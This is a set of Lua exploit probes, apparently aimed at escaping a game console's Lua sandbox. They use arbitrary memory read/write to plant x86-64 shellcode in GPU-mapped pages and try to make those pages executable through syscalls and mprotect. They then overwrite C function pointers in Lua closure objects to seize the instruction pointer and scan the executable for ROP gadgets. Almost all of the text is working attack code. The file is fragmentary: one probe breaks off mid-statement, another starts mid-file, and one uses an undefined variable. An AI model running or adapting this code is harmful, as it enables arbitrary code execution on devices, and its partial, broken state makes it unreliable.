## probes/phase14_final_push/54l_rwx_verify.lua

```lua
-- CRASH_CLASS: HIGH
-- PROBE 54l: Verify if sys 588 actually makes GPU pages executable
--
-- Context: Probe 54d showed sys 588 returning ret=0 when setting prot=7 (RWX)
-- on GPU mmap pages. But ret=0 might not mean the permission actually changed.
-- This probe verifies by:
-- 1) Allocating GPU mmap region
-- 2) Writing known shellcode (ret-sled: 0xC3 = ret instruction)
-- 3) Calling sys 588 to set RWX
-- 4) Attempting to read the page (if XO, read would fail)
-- 5) Trying mprotect to see current actual permissions
-- 6) If CClosure +0x30 redirect works, attempting execution
--
-- Also tests: does 585 (mtype_protect) change permissions differently than 588?

print("=== PROBE 54l: RWX VERIFICATION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc_mmap = make_syscall(477)
local sc_mprotect = make_syscall(74)
local sc585 = make_syscall(585)
local sc588 = make_syscall(588)
local sc572 = make_syscall(572)

-- Step 1: Allocate GPU mmap region
print("[*] Step 1: Allocate GPU mmap region")
local gpu_size = 4 * 0x4000  -- 4 pages (64KB)
local gpu = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local gpu_h, gpu_l = get_hi_lo(gpu)
print("  GPU mmap at: " .. hexval(gpu))

if gpu_h == 0xFFFFFFFF or (gpu_h == 0 and gpu_l == 0) then
    print("  FAILED to allocate GPU region")
    print("=== PROBE 54l ABORTED ===")
    return
end

-- Step 2: Write test patterns to verify R/W works
print("")
print("[*] Step 2: Verify R/W on GPU pages")
local test_ok = safe_wd(gpu, 0x41414141)
local readback = safe_rd(gpu)
print(string.format("  Write 0x41414141, readback = 0x%08X  %s",
    readback or 0, test_ok and readback == 0x41414141 and "OK" or "FAIL"))

-- Write x86-64 shellcode: simple ret (0xC3) sled + NOP sled
-- This is safe: even if executed, it just returns
print("")
print("[*] Step 3: Write ret-sled shellcode to GPU page")
-- Fill first page with NOPs (0x90) then RET (0xC3)
for i = 0, 0x3FF0, 4 do
    safe_wd(gpu + i, 0x90909090)  -- NOP NOP NOP NOP
end
-- Put RET at several offsets
safe_wd(gpu, 0x909090C3)       -- RET at +0
safe_wd(gpu + 0x100, 0x909090C3)  -- RET at +0x100
safe_wd(gpu + 0x1000, 0x909090C3) -- RET at +0x1000

local verify = safe_rd(gpu)
print(string.format("  gpu[0] = 0x%08X (expect 0x909090C3)", verify or 0))

-- Step 4: Call sys 588 to set RWX (prot=7)
print("")
print("[*] Step 4: sys 588 set RWX on GPU region")
local structbuf = memory.alloc(0x100)
for i = 0, 0x3F, 4 do safe_wd(structbuf + i, 0) end
safe_wd(structbuf, 7)  -- prot = PROT_READ|PROT_WRITE|PROT_EXEC

local ok588, ret588 = pcall(function()
    return sc588(uint64(gpu), uint64(gpu_size), uint64(structbuf),
        uint64(0), uint64(0), uint64(0))
end)
if ok588 then
    print("  588(gpu, size, &{prot=7}) = " .. signed32(ret588))
else
    print("  588 CRASHED: " .. tostring(ret588))
end

-- Step 5: Verify page is still readable after 588
print("")
print("[*] Step 5: Post-588 read test")
local post_read = safe_rd(gpu)
print(string.format("  gpu[0] = 0x%08X (should still be 0x909090C3)", post_read or 0))

-- Step 6: Try mprotect to check/change permissions
print("")
print("[*] Step 6: mprotect permission tests")

-- Try mprotect(gpu, size, PROT_READ|PROT_EXEC) = 5
local ok_rx, ret_rx = pcall(function()
    return sc_mprotect(uint64(gpu), uint64(gpu_size), uint64(5))
end)
if ok_rx then
    print("  mprotect(gpu, RX=5) = " .. signed32(ret_rx))
else
    print("  mprotect(gpu, RX=5) CRASHED")
end

-- Try mprotect(gpu, size, PROT_READ|PROT_WRITE|PROT_EXEC) = 7
local ok_rwx, ret_rwx = pcall(function()
    return sc_mprotect(uint64(gpu), uint64(gpu_size), uint64(7))
end)
if ok_rwx then
    print("  mprotect(gpu, RWX=7) = " .. signed32(ret_rwx))
else
    print("  mprotect(gpu, RWX=7) CRASHED")
end

-- Try mprotect(gpu, size, PROT_EXEC) = 4
local ok_x, ret_x = pcall(function()
    return sc_mprotect(uint64(gpu), uint64(gpu_size), uint64(4))
end)
if ok_x then
    print("  mprotect(gpu, X=4) = " .. signed32(ret_x))
    if signed32(ret_x) == 0 then
        print("  >>> mprotect EXEC succeeded! Checking if page is now XO...")
        local post_x_read = safe_rd(gpu)
        if post_x_read == nil then
            print("  >>> Page is now XO (read failed) — EXEC permission IS set!")
        else
            print(string.format("  >>> Page still readable (0x%08X) — might be RX now", post_x_read))
        end
        -- Restore RW so we don't lose access
        pcall(function() sc_mprotect(uint64(gpu), uint64(gpu_size), uint64(3)) end)
    end
else
    print("  mprotect(gpu, X=4) CRASHED")
end

-- Step 7: Use sys 572 to query VM info about the GPU region
print("")
print("[*] Step 7: sys 572 VM info on GPU region")
local vmbuf = memory.alloc(0x200)
for i = 0, 0x1FF, 4 do safe_wd(vmbuf + i, 0) end

-- Try: 572(gpu_addr, outbuf, size)
local ok572, ret572 = pcall(function()
    return sc572(uint64(gpu), uint64(vmbuf), uint64(0x200),
        uint64(0), uint64(0), uint64(0))
end)
if ok572 then
    local rv = signed32(ret572)
    print("  572(gpu, outbuf, 0x200) = " .. rv)
    if rv == 0 then
        -- Dump first 72 bytes
        for i = 0, 68, 4 do
            local v = safe_rd(vmbuf + i)
            if v and v ~= 0 then
                print(string.format("    +%02X: 0x%08X", i, v))
            end
        end
    end
end

-- Also try with outbuf as first arg (the layout that returned ret=0 in 54f)
for i = 0, 0x1FF, 4 do safe_wd(vmbuf + i, 0) end
local ok572b, ret572b = pcall(function()
    return sc572(uint64(vmbuf), uint64(0x200), uint64(0),
        uint64(0), uint64(0), uint64(0))
end)
if ok572b then
    local rv = signed32(ret572b)
    print("  572(outbuf, 0x200, 0) = " .. rv)
    if rv == 0 then
        for i = 0, 68, 4 do
            local v = safe_rd(vmbuf + i)
            if v and v ~= 0 then
                print(string.format("    +%02X: 0x%08X", i, v))
            end
        end
    end
end

-- Step 8: Try sys 585 (mtype_protect) with EXEC
print("")
print("[*] Step 8: sys 585 mtype_protect with EXEC flags")
-- 585 returned 1 in 54d for 585(0, 0x4000, 3)
-- Try on GPU region with various prot values
for _, prot in ipairs({3, 5, 7, 0x33, 0x37}) do
    local ok585, ret585 = pcall(function()
        return sc585(uint64(gpu), uint64(gpu_size), uint64(prot),
            uint64(0), uint64(0), uint64(0))
    end)
    if ok585 then
        print(string.format("  585(gpu, size, 0x%X) = %d", prot, signed32(ret585)))
    else
        print(string.format("  585(gpu, size, 0x%X) CRASHED", prot))
    end
end

-- Step 9: CClosure function pointer analysis
print("")
print("[*] Step 9: CClosure C function pointer")

-- Get CClosure address from a known function
local test_fn = function() return 42 end
local fn_str = tostring(test_fn)
print("  test function: " .. fn_str)

-- Try to get the CClosure struct address from the function
local fn_addr_str = fn_str:match("0x([0-9a-fA-F]+)")
if fn_addr_str then
    local fn_addr = uint64("0x" .. fn_addr_str)
    print("  CClosure at: " .. hexval(fn_addr))

    -- Read +0x30 (C function pointer from 53d results)
    local cfunc = safe_rq(fn_addr + 0x30)
    print("  +0x30 (C func ptr): " .. hexval(cfunc))

    -- Read all offsets for context
    for off = 0, 0x38, 8 do
        local val = safe_rq(fn_addr + off)
        print(string.format("    +0x%02X: %s", off, hexval(val)))
    end

    -- Can we find a simple gadget in eboot?
    -- Look for RET (0xC3) in known eboot range
    local pipe_str = tostring(syscall.pipe)
    print("  pipe: " .. pipe_str)
else
    print("  Could not parse CClosure address")
end

-- Step 10: If GPU page is writable and 588 accepted RWX,
-- try writing a getpid shellcode and redirecting CClosure
print("")
print("[*] Step 10: Shellcode + CClosure redirect test")
print("  WARNING: This may crash the process")

-- Write x86-64 getpid shellcode to GPU page offset 0x2000
-- mov eax, 20  (syscall number for getpid)
-- syscall
-- ret
local sc_offset = 0x2000
safe_wd(gpu + sc_offset,     0x000014B8)  -- mov eax, 20
safe_wd(gpu + sc_offset + 4, 0x90050F00)  -- syscall; nop
safe_wd(gpu + sc_offset + 8, 0x909090C3)  -- ret; nop; nop; nop

local sc_readback = safe_rd(gpu + sc_offset)
print(string.format("  shellcode[0] = 0x%08X (expect 0x000014B8)", sc_readback or 0))

-- Call sys 588 again to ensure RWX on this specific page
for i = 0, 0x3F, 4 do safe_wd(structbuf + i, 0) end
safe_wd(structbuf, 7)
pcall(function()
    sc588(uint64(gpu + sc_offset), uint64(0x4000), uint64(structbuf),
        uint64(0), uint64(0), uint64(0))
end)

-- Now try redirecting CClosure +0x30 to our shellcode
if fn_addr_str then
    local fn_addr = uint64("0x" .. fn_addr_str)
    local old_cfunc = safe_rq(fn_addr + 0x30)
    print("  Old C func: " .. hexval(old_cfunc))

    -- Calculate shellcode address
    local sc_addr_h, sc_addr_l = get_hi_lo(gpu)
    sc_addr_l = sc_addr_l + sc_offset
    -- Handle carry
    if sc_addr_l >= 0x100000000 then
        sc_addr_h = sc_addr_h + 1
        sc_addr_l = sc_addr_l - 0x100000000
    end
    local sc_addr = uint64(string.format("0x%X%08X", sc_addr_h, sc_addr_l))
    print("  Shellcode addr: " .. hexval(sc_addr))

    -- Stop GC
    collectgarbage("stop")

    -- Write shellcode address to CClosure +0x30
    local write_ok = safe_wq(fn_addr + 0x30, sc_addr)
    print("  Write to +0x30: " .. tostring(write_ok))

    if write_ok then
        -- Try calling the function
        local exec_ok, exec_ret = pcall(function() return test_fn() end)
        if exec_ok then
            print("  >>> EXECUTION RETURNED: " .. tostring(exec_ret))
            if type(exec_ret) == "number" and exec_ret > 0 and exec_ret < 1000 then
                print("  >>> POSSIBLE PID! NATIVE CODE EXECUTION ACHIEVED!")
            end
        else
            print("  >>> EXECUTION CRASHED: " .. tostring(exec_ret))
        end

        -- Restore original function pointer
        safe_wq(fn_addr + 0x30, old_cfunc)
        print("  Restored original C func ptr")
    end

    collectgarbage("restart")
end

print("")
print("=== PROBE 54l COMPLETE ===")
```

```lua
-- CRASH_CLASS: HIGH
-- PROBE 54m: CClosure +0x30 redirect — fixed address parsing
--
-- Context: 54l confirmed sys 588 ret=0 is a no-op (mprotect EXEC still fails).
-- But CClosure +0x30 redirect was never tested because tostring(function)
-- outputs "function: 310ce81c0" (no 0x prefix) and the regex missed it.
-- This probe fixes parsing and tests:
-- 1) CClosure +0x30 redirect to a RET gadget in eboot (RX, known executable)
-- 2) CClosure +0x30 redirect to GPU shellcode (to see if crash is SIGILL vs SIGSEGV)
-- 3) If eboot RET works: redirect to getpid gadget chain

print("=== PROBE 54m: CCLOSURE REDIRECT (FIXED) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

-- Step 1: Parse CClosure address with flexible regex
print("[*] Step 1: Get CClosure address")
local test_fn = function() return 42 end
local fn_str = tostring(test_fn)
print("  tostring: " .. fn_str)

-- Try both formats: "function: 0x310ce81c0" and "function: 310ce81c0"
local fn_addr_str = fn_str:match("0x([0-9a-fA-F]+)")
if not fn_addr_str then
    fn_addr_str = fn_str:match(": ([0-9a-fA-F]+)")
end
if not fn_addr_str then
    fn_addr_str = fn_str:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)")
end

if not fn_addr_str then
    print("  FAILED to parse address from: " .. fn_str)
    print("=== PROBE 54m ABORTED ===")
    return
end

local fn_addr = uint64("0x" .. fn_addr_str)
print("  CClosure at: " .. hexval(fn_addr))

-- Step 2: Dump CClosure struct
print("")
print("[*] Step 2: CClosure struct dump")
for off = 0, 0x48, 8 do
    local val = safe_rq(fn_addr + off)
    print(string.format("  +0x%02X: %s", off, hexval(val)))
end

local old_cfunc = safe_rq(fn_addr + 0x30)
print("")
print("  C func ptr (+0x30): " .. hexval(old_cfunc))
local cfunc_h, cfunc_l = get_hi_lo(old_cfunc)

-- Step 3: Find a RET gadget in eboot
print("")
print("[*] Step 3: Find RET (0xC3) gadget in eboot")

-- Get eboot base from dynlib_get_info
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
local text_size_lo = safe_rd(info + 0x110)

if text_lo and text_hi then
    local eboot_base = uint64(string.format("0x%X%08X", text_hi, text_lo))
    print("  eboot .text base: " .. hexval(eboot_base))
    print("  eboot .text size: " .. string.format("0x%X", text_size_lo or 0))

    -- Scan for RET (0xC3) byte in first 0x1000 bytes of eboot
    local ret_gadget = nil
    for off = 0, 0xFFF do
        local b = safe_rd(eboot_base + off)
        if b then
            -- Check if low byte is 0xC3
            if (b % 256) == 0xC3 then
                ret_gadget = off
                print(string.format("  Found RET at eboot+0x%X (dword: 0x%08X)", off, b))
                break
            end
        end
    end

    if not ret_gadget then
        -- Also check for C3 in second byte, third, fourth
        for off = 0, 0xFFF do
            local b = safe_rd(eboot_base + off)
            if b then
                local b1 = math.floor(b / 256) % 256
                local b2 = math.floor(b / 65536) % 256
                local b3 = math.floor(b / 16777216) % 256
                if b1 == 0xC3 then
                    ret_gadget = off + 1
                    print(string.format("  Found RET at eboot+0x%X", ret_gadget))
                    break
                elseif b2 == 0xC3 then
                    ret_gadget = off + 2
                    print(string.format("  Found RET at eboot+0x%X", ret_gadget))
                    break
                elseif b3 == 0xC3 then
                    ret_gadget = off + 3
                    print(string.format("  Found RET at eboot+0x%X", ret_gadget))
                    break
                end
            end
        end
    end

    -- Step 4: Test CClosure redirect to eboot RET gadget
    if ret_gadget then
        print("")
        print("[*] Step 4: CClosure +0x30 redirect to eboot RET gadget")

        local gadget_lo = text_lo + ret_gadget
        local gadget_hi = text_hi
        if gadget_lo >= 0x100000000 then
            gadget_hi = gadget_hi + 1
            gadget_lo = gadget_lo - 0x100000000
        end
        local gadget_addr = uint64(string.format("0x%X%08X", gadget_hi, gadget_lo))
        print("  RET gadget addr: " .. hexval(gadget_addr))
        print("  Old C func: " .. hexval(old_cfunc))

        collectgarbage("stop")

        -- Write RET gadget address to +0x30
        local wok = safe_wq(fn_addr + 0x30, gadget_addr)
        print("  Write to +0x30: " .. tostring(wok))

        -- Verify write
        local verify = safe_rq(fn_addr + 0x30)
        print("  Verify +0x30: " .. hexval(verify))

        if wok then
            -- Call the function — if RET executes, it returns to caller
            -- The return value will be whatever was in rax
            print("  Calling test_fn()...")
            local exec_ok, exec_ret = pcall(function() return test_fn() end)
            if exec_ok then
                print("  >>> RETURNED: " .. tostring(exec_ret) .. " (type: " .. type(exec_ret) .. ")")
                print("  >>> CClosure +0x30 REDIRECT WORKS! We control the instruction pointer!")
            else
                print("  >>> CRASHED: " .. tostring(exec_ret))
            end
        end

        -- Restore
        safe_wq(fn_addr + 0x30, old_cfunc)
        print("  Restored original C func")

        -- Verify restore
        local restored = safe_rq(fn_addr + 0x30)
        print("  Verify restore: " .. hexval(restored))

        -- Verify function still works
        local rok, rval = pcall(function() return test_fn() end)
        if rok then
            print("  test_fn() after restore: " .. tostring(rval))
        else
            print("  test_fn() after restore CRASHED")
        end

        collectgarbage("restart")
    else
        print("  No RET gadget found in eboot first 0x1000 bytes")
    end

    -- Step 5: Also test redirect to the ORIGINAL C func address
    -- (This tests that the redirect mechanism itself works — calling the
    -- same address that was already there should behave identically)
    print("")
    print("[*] Step 5: Control test — redirect to same address")
    collectgarbage("stop")

    safe_wq(fn_addr + 0x30, old_cfunc)
    local ctrl_ok, ctrl_ret = pcall(function() return test_fn() end)
    if ctrl_ok then
        print("  Control call returned: " .. tostring(ctrl_ret) .. " (expect 42)")
    else
        print("  Control call CRASHED: " .. tostring(ctrl_ret))
    end

    collectgarbage("restart")

    -- Step 6: Try redirect to eboot base (known code, but not RET)
    -- to see what kind of crash we get
    print("")
    print("[*] Step 6: Redirect to eboot base (crash test for signal type)")
    collectgarbage("stop")

    safe_wq(fn_addr + 0x30, eboot_base)
    print("  Wrote eboot_base to +0x30")
    local crash_ok, crash_ret = pcall(function() return test_fn() end)
    if crash_ok then
        print("  >>> RETURNED: " .. tostring(crash_ret) .. " — unexpected!")
    else
        print("  >>> CRASHED: " .. tostring(crash_ret))
    end

    -- Restore
    safe_wq(fn_addr + 0x30, old_cfunc)
    local rok2, rval2 = pcall(function() return test_fn() end)
    print("  Restored, test_fn() = " .. tostring(rval2))

    collectgarbage("restart")
else
    print("  Could not get eboot base")
end

print("")
print("=== PROBE 54m COMPLETE ===")
```

```lua
-- CRASH_CLASS: HIGH
-- PROBE 54n: CClosure redirect on REAL C functions
--
-- Context: 54m showed +0x30 redirect on a Lua closure always returns 42
-- regardless of what address is written — because Lua closures (LClosure)
-- are bytecode-interpreted and don't call through a C function pointer.
-- We need to test with REAL C functions (CClosure): print, type, tostring, etc.
-- These have a C function pointer that the VM actually calls.
--
-- Plan:
-- 1) Dump struct layout of known C functions (print, type, tostring, pcall)
-- 2) Compare with Lua closure layout to find structural differences
-- 3) Identify the C function pointer field
-- 4) Redirect to eboot RET gadget
-- 5) If that works: redirect to custom shellcode

print("=== PROBE 54n: REAL C FUNCTION REDIRECT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(": ([0-9a-fA-F]+)") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex), hex end
    return nil, nil
end

-- Step 1: Dump struct layout of C functions vs Lua closures
print("[*] Step 1: Compare C function vs Lua closure struct layouts")
print("")

local targets = {
    {"print (C)",    print},
    {"type (C)",     type},
    {"tostring (C)", tostring},
    {"pcall (C)",    pcall},
    {"pairs (C)",    pairs},
    {"Lua closure",  function() return 42 end},
}

local cfunc_addrs = {}

for _, t in ipairs(targets) do
    local name, fn = t[1], t[2]
    local addr, hex = parse_func_addr(fn)
    if addr then
        print("  " .. name .. " at " .. hexval(addr))
        for off = 0, 0x48, 8 do
            local val = safe_rq(addr + off)
            print(string.format("    +0x%02X: %s", off, hexval(val)))
        end
        -- Check which offset has an eboot-range pointer (the C func ptr)
        -- Eboot is around 0x00000000_6xxxxxxx or 0x00000001_5xxxxxxx
        for off = 0, 0x48, 8 do
            local val = safe_rq(addr + off)
            if val then
                local h, l = get_hi_lo(val)
                -- C function pointers should be in executable code ranges
                -- eboot range seen: 0x00000001_52D10EE0 and 0x00000000_694FC000
                if (h == 0 and l >= 0x60000000 and l < 0x80000000) or
                   (h == 1 and l >= 0x40000000 and l < 0x60000000) then
                    print(string.format("    ^^^ +0x%02X looks like code pointer!", off))
                end
            end
        end
        print("")
        table.insert(cfunc_addrs, {name=name, addr=addr, fn=fn})
    else
        print("  " .. name .. " — could not parse address: " .. tostring(fn))
    end
end

-- Step 2: Identify the type tag difference between CClosure and LClosure
print("[*] Step 2: Type tag analysis")
-- In Lua 5.1: LClosure has tt=6 (LUA_TFUNCTION), CClosure has tt=6 too
-- But the struct differs: CClosure has f (C func ptr), LClosure has p (Proto*)
-- Offset +0x08 low byte might be the type tag or subtype
for _, t in ipairs(cfunc_addrs) do
    local val08 = safe_rq(t.addr + 0x08)
    if val08 then
        local h, l = get_hi_lo(val08)
        print(string.format("  %s +0x08: 0x%08X_%08X (low byte: 0x%02X)",
            t.name, h, l, l % 256))
    end
end

-- Step 3: Get eboot RET gadget

print("[*] Step 3: Find eboot RET gadget")

safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)

if not text_lo or not text_hi then
    print("  Could not get eboot base")
    print("=== PROBE 54n ABORTED ===")
    return
end

local eboot_base = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("  eboot .text: " .. hexval(eboot_base))

-- Find RET
local ret_off = nil
for off = 0, 0xFFF do
    local dw = safe_rd(eboot_base + off)
    if dw then
        if (dw % 256) == 0xC3 then
            ret_off = off
            break
        end
        if (math.floor(dw / 256) % 256) == 0xC3 then
            ret_off = off + 1
            break
        end
        if (math.floor(dw / 65536) % 256) == 0xC3 then
            ret_off = off + 2
            break
        end
        if (math.floor(dw / 16777216) % 256) == 0xC3 then
            ret_off = off + 3
            break
        end
    end
end

if not ret_off then
    print("  No RET found in first 4KB")
    print("=== PROBE 54n ABORTED ===")
    return
end

local ret_lo = text_lo + ret_off
local ret_hi = text_hi
if ret_lo >= 0x100000000 then
    ret_hi = ret_hi + 1
    ret_lo = ret_lo - 0x100000000
end
local ret_addr = uint64(string.format("0x%X%08X", ret_hi, ret_lo))
print("  RET gadget: " .. hexval(ret_addr) .. " (eboot+" .. string.format("0x%X", ret_off) .. ")")

-- Step 4: Try redirect on each C function
-- For C functions, the C func ptr is likely at +0x30 (same as CClosure)
-- But we need to find which offset matters
print("")
print("[*] Step 4: Redirect C functions to RET gadget")

-- Test with 'type' — it's simple and returns a string
-- type("hello") should return "string"
-- If we redirect its C func ptr, calling type() should crash or return garbage

-- First verify type() works
local type_ok, type_ret = pcall(function() return type("hello") end)
print("  type('hello') before: " .. tostring(type_ret))

local type_addr = cfunc_addrs[2] and cfunc_addrs[2].addr
if type_addr then
    -- Try each offset that might be the C func pointer
    -- Based on struct dump, look for the eboot-range value
    local candidate_offsets = {}
    for off = 0, 0x48, 8 do
        local val = safe_rq(type_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            if (h == 0 and l >= 0x60000000 and l < 0x80000000) or
               (h == 1 and l >= 0x40000000 and l < 0x60000000) then
                table.insert(candidate_offsets, off)
            end
        end
    end

    print("  Candidate C func ptr offsets: ")
    for _, off in ipairs(candidate_offsets) do
        print(string.format("    +0x%02X: %s", off, hexval(safe_rq(type_addr + off))))
    end

    -- Test each candidate offset
    for _, off in ipairs(candidate_offsets) do
        print("")
        print(string.format("  Testing +0x%02X redirect on type():", off))
        local old_val = safe_rq(type_addr + off)
        print("    Old value: " .. hexval(old_val))

        collectgarbage("stop")

        local wok = safe_wq(type_addr + off, ret_addr)
        print("    Write RET addr: " .. tostring(wok))

        if wok then
            local verify = safe_rq(type_addr + off)
            print("    Verify: " .. hexval(verify))

            -- Call type()
            local tok, tret = pcall(function() return type("hello") end)
            if tok then
                print("    >>> RETURNED: " .. tostring(tret) .. " (type: " .. type(tret) .. ")")
                if tret ~= "string" then
                    print("    >>> BEHAVIOR CHANGED! Offset +0x" .. string.format("%02X", off) .. " IS the C func ptr!")
                else
                    print("    >>> Same result — this offset is NOT the C func ptr")
                end
            else

                print("    >>> Offset +0x" .. string.format("%02X", off) .. " IS the C func ptr (crash = execution attempted)!")
```

```lua
print("  Wrote: " .. hexval(tostring_cfunc))
print("  Verify: " .. hexval(verify))

-- Call type() — should now behave like tostring()
local ok1, ret1 = pcall(function() return type(42) end)
if ok1 then
    print("  type(42) = " .. tostring(ret1) .. "  (expect '42' if redirected, 'number' if not)")
    if ret1 == "42" then
        print("  >>> CONFIRMED: type() now behaves as tostring()!")
        print("  >>> WE HAVE INSTRUCTION POINTER CONTROL!")
    elseif ret1 == "number" then
        print("  >>> No effect — +0x20 might not be the right offset after all")
    else
        print("  >>> Unexpected result: " .. tostring(ret1))
    end
else
    print("  type(42) CRASHED: " .. tostring(ret1))
end

-- Restore immediately
safe_wq(type_addr + 0x20, old_type_cfunc)

-- Verify restore
local ok2, ret2 = pcall(function() return type(42) end)
print("  After restore: type(42) = " .. tostring(ret2))

collectgarbage("restart")

-- Step 3: Scan eboot for useful gadgets
print("")
print("[*] Step 3: Eboot gadget scan")

local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
local text_size_lo = safe_rd(info + 0x110)

if not text_lo or not text_hi then
    print("  Could not get eboot base")
    print("=== PROBE 54o DONE (partial) ===")
    return
end

local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("  eboot .text: " .. hexval(eboot) .. " size: " .. string.format("0x%X", text_size_lo or 0))

-- Scan for gadgets in first 64KB of eboot
-- Looking for:
-- 0xC3           = ret
-- 0xC390         = ret; nop
-- 0x31C0C3       = xor eax,eax; ret  (return 0)
-- 0x48C7C0xxC3   = mov rax, imm8; ret
-- 0xB8xxxxxxC3   = mov eax, imm32; ret
-- 0x0F05         = syscall
-- 0x0F05C3       = syscall; ret

local gadgets_found = 0
local ret_gadget = nil
local xor_eax_ret = nil
local syscall_ret = nil
local mov_eax_ret = {}

for off = 0, 0xFFFF do
    local dw = safe_rd(eboot + off)
    if dw then
        -- Check for xor eax, eax; ret (31 C0 C3)
        if (dw % 0x1000000) == 0xC3C031 then
            if not xor_eax_ret then
                xor_eax_ret = off
                print(string.format("  GADGET: xor eax,eax; ret at eboot+0x%X", off))
                gadgets_found = gadgets_found + 1
            end
        end
        -- Check for syscall; ret (0F 05 C3)
        if (dw % 0x1000000) == 0xC3050F then
            if not syscall_ret then
                syscall_ret = off
                print(string.format("  GADGET: syscall; ret at eboot+0x%X", off))
                gadgets_found = gadgets_found + 1
            end
        end
        -- Check for ret (C3) as first byte
        if (dw % 256) == 0xC3 and not ret_gadget then
            ret_gadget = off
            -- Don't print, we already know this exists
        end
        -- Check for mov eax, imm32; ret (B8 xx xx xx xx C3)
        -- B8 is first byte of dword, then next dword starts with xx C3
        if (dw % 256) == 0xB8 and #mov_eax_ret < 5 then
            local next_dw = safe_rd(eboot + off + 4)
            if next_dw then
                local next_b1 = next_dw % 256
                if next_b1 == 0xC3 then
                    local imm = math.floor(dw / 256)
                    table.insert(mov_eax_ret, {off=off, imm=imm})
                    print(string.format("  GADGET: mov eax, 0x%X; ret at eboot+0x%X", imm, off))
                    gadgets_found = gadgets_found + 1
                end
            end
        end
        -- Check for pop rdi; ret (5F C3)
        if (dw % 0x10000) == 0xC35F then
            print(string.format("  GADGET: pop rdi; ret at eboot+0x%X", off))
            gadgets_found = gadgets_found + 1
        end
        -- Check for pop rsi; ret (5E C3)
        if (dw % 0x10000) == 0xC35E then
            print(string.format("  GADGET: pop rsi; ret at eboot+0x%X", off))
            gadgets_found = gadgets_found + 1
        end
        -- Check for pop rdx; ret (5A C3)
        if (dw % 0x10000) == 0xC35A then
            print(string.format("  GADGET: pop rdx; ret at eboot+0x%X", off))
            gadgets_found = gadgets_found + 1
        end
        -- Check for pop rax; ret (58 C3)
        if (dw % 0x10000) == 0xC358 then
            print(string.format("  GADGET: pop rax; ret at eboot+0x%X", off))
            gadgets_found = gadgets_found + 1
        end
    end
    -- Limit output
    if gadgets_found >= 30 then
        print("  (stopping scan at 30 gadgets)")
        break
    end
end

print(string.format("  Total gadgets found: %d (in first 64KB)", gadgets_found))

-- Step 4: If we have syscall;ret, try getpid via ROP
if syscall_ret then
    print("")
    print("[*] Step 4: Try getpid via syscall;ret gadget")

